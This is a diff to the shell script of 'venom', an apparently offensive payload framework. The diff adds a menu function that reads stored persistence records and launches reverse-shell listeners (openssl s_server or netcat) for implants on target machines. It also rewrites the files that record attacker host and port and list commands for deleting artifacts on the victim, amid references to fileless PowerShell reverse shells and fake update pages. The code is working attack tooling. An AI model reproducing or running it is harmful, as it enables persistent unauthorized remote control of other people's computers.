@@ -11972,6 +11972,7 @@ cat << !
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
+    ║   H    - Easy Start Of Stored Handler(s)                    ║
     ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
@@ -11987,8 +11988,65 @@ case $choice in
 3) sh_evasion3 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
+h|H) sh_per_handler ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
 esac
+}
+
+
+
+# ---------------------------------------------
+# EASY START OF PERSISTENCE HANDLER(S) FUNCTION
+# ---------------------------------------------
+sh_per_handler () {
+Colors;
+
+echo ""
+cd $IPATH/output
+per_list=$(ls *.txt)
+echo "${BlueF}Listing Persistence Handler(s) Stored${white}"
+echo "-------------------------------------";sleep 1
+if [ -z "$per_list" ]; then
+  echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 1
+  echo "${RedF}[x]${white} None persistence ID Handler(s) Found .."${Reset};sleep 2
+  clear;sh_ninja
+fi
+echo "$per_list"
+echo "";sleep 2
+
+
+## Reading settings from persistence stored file ..
+handler=$(zenity --title="☠ PERSISTENCE HANDLER SELLECTION ☠" --text "example: persistence_ID_4Fn7.txt" --entry --width 300) > /dev/null 2>&1
+set_handler=$(cat $handler|grep -m 1 'HANDLER'|cut -d ':' -f2)
+set_lhost=$(cat $handler|grep -m 1 'LHOST'|cut -d ':' -f2)
+set_lport=$(cat $handler|grep -m 1 'LPORT'|cut -d ':' -f2)
+set_dates=$(cat $handler|grep -m 1 'ACTIVE_ON'|cut -d '=' -f2)
+
+
+## Displaying settings to user
+echo ""${BlueF}
+cat << !
+Handler: $handler
+--------------------------------
+LPORT    : $set_lport
+LHOST    : $set_lhost
+LOLBin   : Powershell (Download)
+ACTIVE_ON: $set_dates
+!
+echo ""${Reset};
+
+sleep 2
+## Execute Sellected Handler Settings to Run
+QuE=$(zenity --question --title "☠ RUN SELLECTED HANDLER ☠" --text "Do you wish to run the Sellected Handler ?" --width 320) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+   xterm -T " PERSISTENCE LISTENER - $set_lhost:$set_lport" -geometry 110x23 -e "$set_handler"
+else
+  echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 2
+fi
+
+cd $IPATH
+clear
+sh_ninja
 }
 
 
@@ -12165,16 +12223,16 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Build Report File in output folder ..
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" ]; then
-   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.del
+   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.del
+   echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
+   echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
 else
-   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.del
+   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.del
+   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt.del
 fi
-zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
+zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.del" --info > /dev/null 2>&1
 sh_menu
 }
 
@@ -12398,10 +12456,11 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LHOST: $lhost" > $IPATH/output/persistence_ID_$random_name.txt
-   echo "HANDLER: cd venom/output" >> $IPATH/output/persistence_ID_$random_name.txt
-   echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.txt
-   echo "ACTIVE ON: $dtr" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "LPORT:$lport" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "DIR: cd venom/output" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "HANDLER:sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/persistence_ID_$random_name.txt
@@ -12628,9 +12687,10 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LHOST: $lhost" > $IPATH/output/persistence_ID_$random_name.txt
-   echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/persistence_ID_$random_name.txt
-   echo "ACTIVE ON: $dtr" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "LPORT:$lport" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "HANDLER:sudo nc -lvp $lport" >> $IPATH/output/persistence_ID_$random_name.txt
+   echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/persistence_ID_$random_name.txt
